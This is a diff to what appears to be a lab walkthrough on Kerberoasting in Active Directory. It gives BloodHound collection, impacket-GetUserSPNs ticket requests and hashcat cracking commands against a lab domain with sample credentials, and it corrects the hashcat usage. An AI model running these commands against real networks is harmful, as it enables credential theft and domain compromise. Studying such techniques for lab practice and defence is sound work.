@@ -76,9 +76,11 @@ bloodhound-python -u bob -p 'Autumn2024!' -d corp.local -ns 10.0.0.10 -c All
 # 2. Request a TGS for every SPN user (svc_sql appears here)
 impacket-GetUserSPNs -dc-ip 10.0.0.10 'corp.local/bob:Autumn2024!' -request -outputfile tgs.txt
 
-# 3. Inspect and crack the TGS (mode 13100 = Kerberoast TGS-REP)
-cat tgs.txt
-hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt --show
+# 3. Crack the TGS (mode 13100 = Kerberoast TGS-REP), then read the recovered password.
+# `--show` only prints what is already in the potfile: it never cracks, so it is a second
+# command, not a flag on the first one.
+hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 13100 tgs.txt --show
 ```
 
 **Expected outcome:** the TGS for `svc_sql` cracks to `sqlp@ss123` — a domain
